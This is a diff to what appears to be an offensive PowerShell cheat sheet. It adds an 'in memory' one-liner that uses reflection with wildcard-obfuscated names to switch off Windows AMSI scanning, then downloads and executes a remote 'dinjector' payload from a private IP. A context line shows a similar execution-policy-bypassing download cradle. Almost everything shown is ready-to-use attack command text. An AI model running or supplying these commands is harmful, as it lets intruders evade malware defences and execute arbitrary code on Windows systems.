@@ -20,6 +20,14 @@ Works in CLM | Proxy Aware
 powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.22.55/run.txt'))
 ```
 
+### Invoke-Command (in memory)
+Bypass CLM | Proxy Aware 
+-------|---------
+[  ] | [ X ]
+```
+powershell -ep bypass -c "Invoke-Command -ScriptBlock {$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*tFailed\") {$f=$e}};$f.SetValue($null,$true);iex((new-object system.net.webclient).downloadstring('http://192.168.1.128/psscripts/dinjector/dinjector.txt'))}"
+```
+
 
 ## Download Files
 
